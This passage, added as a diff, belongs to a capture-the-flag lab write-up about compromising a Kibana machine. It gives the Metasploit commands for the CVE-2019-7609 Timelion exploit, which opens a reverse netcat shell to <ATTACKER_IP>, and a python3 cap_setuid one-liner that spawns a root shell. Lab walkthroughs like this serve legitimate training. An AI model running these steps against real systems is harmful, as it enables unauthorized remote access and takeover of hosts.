@@ -38,3 +38,71 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
 
 **Answer:** [CVE-2019-7609](https://nvd.nist.gov/vuln/detail/cve-2019-7609)
+
+---
+
+### Compromise the machine and locate user.txt
+
+1. Use Metasploit to exploit the Kibana Timelion prototype pollution vulnerability. This exploit allows remote code execution by leveraging the prototype pollution flaw in the Timelion visualizer:
+
+```bash
+msfconsole -q
+use exploit/linux/http/kibana_timelion_prototype_pollution_rce
+set RHOSTS <TARGET_IP>
+set RPORT 5601
+set LHOST <ATTACKER_IP>
+set LPORT 4444
+set payload cmd/unix/reverse_netcat
+exploit
+```
+
+2. Once the exploit succeeds, you'll get a reverse shell connection. Navigate to the kiba user's home directory and read the user flag:
+
+```bash
+cd /home/kiba
+cat user.txt
+```
+
+[SCREEN01]
+
+---
+
+### How would you recursively list all of these capabilities?
+
+**Answer:** `getcap -r /`
+
+---
+
+### Escalate privileges and obtain root.txt
+
+1. Search for files with special Linux capabilities that could be exploited for privilege escalation. The `-r` flag searches recursively, and `2>/dev/null` suppresses error messages:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+**Results:**
+
+```
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+```
+
+2. The critical finding is `/home/kiba/.hackmeplease/python3` with the `cap_setuid+ep` capability. This capability allows the Python binary to change the effective user ID. We can exploit this to escalate to root by using `os.setuid(0)` to set our UID to 0 (root):
+
+```bash
+cd /home/kiba/.hackmeplease
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami
+# root
+```
+
+3. Navigate to the root directory and read the final flag:
+
+```bash
+cat /root/root.txt
+```
+
+[SCREEN02]
